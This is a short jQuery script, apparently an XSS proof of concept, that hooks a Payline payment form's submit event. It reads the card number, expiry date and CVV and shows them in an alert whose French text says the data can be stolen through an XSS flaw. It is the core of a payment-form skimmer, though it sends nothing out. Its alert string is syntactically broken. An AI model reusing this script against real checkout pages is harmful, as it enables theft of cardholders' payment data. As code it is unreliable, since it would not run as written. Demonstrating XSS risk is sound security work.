
$( document ).ready(function() {
	$('#paymentInfoForm').addClass('spy');
	
    $('#PaylineForm #mainform').submit(function(){
		var a = $('#paymentCardNumber').val();
		var b = $('#paymentCardExpirationMonth').val();
		var c = $('#paymentCardExpirationYear').val();
		var d = $('#paymentCardCvv').val();
		alert(
			'Votre n° de carte est '+a\n
			'Elle expire le '+b+'/'+c\n
			'Le secret est '+d+\n
			'Tous les informations peuvent être récupérée à cause d\'une faille XSS'
		);
	});
});